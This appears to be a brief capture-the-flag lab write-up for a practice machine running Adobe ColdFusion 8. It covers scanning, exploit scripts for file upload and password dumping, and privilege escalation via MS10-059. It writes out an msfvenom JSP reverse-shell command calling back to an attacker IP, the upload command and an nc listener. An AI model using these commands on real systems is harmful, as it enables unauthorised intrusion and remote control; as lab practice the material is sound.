Arctic ```10.10.10.11```

**Nmap
Gobuster - no use**
- Ports - 135,8500,49154

Adobe Coldfusion 8 located at ```8500```

Vulnerable service - **Coldfusion 8**

- Arbitrary File Upload - arctic.py
- Password getting dumped - 14641.py



- Get a jsp reverse shell
```zsh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 > shell.jsp 
```
- Shell upload
```zsh
./arctic.py 10.10.10.11 8500 shell.jsp
```

- Listener

```zsh
rlwrap nc -lnvp 443
```
*User flag is directly accessible*
**Box is crappy, dies very soon**

-Priv Esc

*Seimpersonate Token was there*
*Vulnerable to Juicy Potato, didnot work box issues*
Used windows exploit suggester. MS10-059 worked for priv escalation.


